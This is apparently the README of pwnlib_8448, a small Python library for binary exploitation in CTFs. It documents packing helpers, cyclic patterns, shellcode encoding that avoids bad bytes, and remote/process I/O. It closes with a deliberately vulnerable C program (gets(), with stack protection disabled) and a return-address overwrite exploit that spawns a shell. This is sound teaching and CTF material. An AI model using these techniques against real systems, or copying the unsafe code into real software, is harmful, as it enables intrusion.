# pwnlib_8448

> A lightweight Python library for binary exploitation, designed for CTFs, learning, and fast scripting.

---

## 📦 Installation

### From GitHub (recommended)

```bash
pip install git+https://github.com/Narkielz/pwnlib_8448.git
```

### From GitLab (fallback)

```bash
pip install git+https://gitlab.com/Narkiel/pwnlib_8448.git
```

### Local development install

```bash
git clone https://github.com/Narkielz/pwnlib_8448.git
cd pwnlib_8448
pip install .
```

---

## 📖 About

**pwnlib_8448** is a minimal alternative to pwntools, focused on simplicity and portability.

It is designed for:

* CTF players
* Binary exploitation learners
* Lightweight exploit scripts (including Termux)

### Supported architectures

* x86
* x86_64 (amd64)
* ARM64

---

## 🚀 Quick Start

```python
from pwnlib_8448 import *

p = Process("./vuln")

payload = b"A" * 40 + p64(0x401196)
p.sendline(payload)

p.interactive()
```

---

## ⚡ Core Features

### 🎨 Logging

Colored logs with automatic hexdump support.

| Function    | Color  | Description             |
| ----------- | ------ | ----------------------- |
| log_info()  | Blue   | Informational messages  |
| log_ok()    | Green  | Success messages        |
| log_warn()  | Yellow | Warning messages        |
| log_error() | Red    | Error messages          |
| log_send()  | Cyan   | Sent data (hexdump)     |
| log_recv()  | Cyan   | Received data (hexdump) |

```python
log_send(b"\x90\x90\x00\xcc")
# >> 90 90 00 cc |....|
```

---

## 📦 Packing / Unpacking

Little-endian helpers for exploit development.

| Function | Size | Example                                  |
| -------- | ---- | ---------------------------------------- |
| p8(x)    | 1B   | p8(0x41) -> b'A'                         |
| p16(x)   | 2B   | p16(0xdead)                              |
| p32(x)   | 4B   | p32(0xcafe)                              |
| p64(x)   | 8B   | p64(0xdeadbeef)                          |
| u8(x)    | 1B   | u8(b'A') -> 65                           |
| u16(x)   | 2B   | u16(b'\xad\xde') -> 0xdead               |
| u32(x)   | 4B   | u32(b'\xfe\xca\x00\x00')                 |
| u64(x)   | 8B   | u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00') |

---

## 🔁 Cyclic Pattern

Generate and analyze cyclic patterns (like Metasploit).

```python
pattern = pattern_create(500)
offset = pattern_offset(0x6161616c, arch=64)

payload = b"A" * offset + p64(0x401196)
```

| Function                    | Description             |
| --------------------------- | ----------------------- |
| pattern_create(size)        | Generate unique pattern |
| pattern_offset(value, arch) | Find offset from crash  |

---

## 🛡️ Hexdump

```python
data = b"Hello\x00\x01"
print(hexdump(data))
```

Features:

* Full formatted dump
* Simple log mode

---

## 🔐 Shellcode Encoding

Automatically encode shellcode to avoid bad bytes.

```python
encoded, status, msg = encode_shellcode(
    b"\x90\x90\xcc",
    arch="amd64",
    bad_bytes=[0x00, 0x0a],
    fallback=True
)
```

Encoding strategies:

* XOR
* ADD
* SUB (auto-selected best fit)

---

## 🌐 Remote Exploitation

```python
r = Remote("example.com", 1337)
r.sendline(b"payload")
data = r.recv(1024)
r.interactive()
```

---

## 🖥️ Local Process

```python
p = Process("./binary")
p.sendline(b"input")
p.interactive()
```

---

## 💣 Full Exploit Example

```c
// vuln.c
// gcc vuln.c -o vuln -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buffer[32];
    printf("> ");
    gets(buffer);
}

int main() {
    setbuf(stdout, NULL);
    vuln();
}
```

```python
from pwnlib_8448 import *

p = Process("./vuln")

offset = pattern_offset(0x6161616c, arch=64)
win = 0x401196

payload = b"A" * offset + p64(win)

p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()
```

---

## 📚 API Reference

### Core functions

| Function         | Description             |
| ---------------- | ----------------------- |
| pattern_create   | Generate cyclic pattern |
| pattern_offset   | Find offset             |
| hexdump          | Format binary output    |
| encode_shellcode | Encode payload          |

### Packing

| Function       | Description   |
| -------------- | ------------- |
| p8/p16/p32/p64 | Pack integers |
| u8/u16/u32/u64 | Unpack bytes  |

### Classes

| Class   | Methods                 |
| ------- | ----------------------- |
| Process | send, recv, interactive |
| Remote  | send, recv, interactive |

---

## ⚠️ Common Bad Bytes

```python
[0x00]                    # null byte
[0x00, 0x0a]              # newline
[0x00, 0x0a, 0x0d]        # CRLF
[0x00, 0x0a, 0x0d, 0x20]  # space
```

---

## 📝 License

MIT License — see LICENSE file

---

## 👤 Author

Luis Fernando
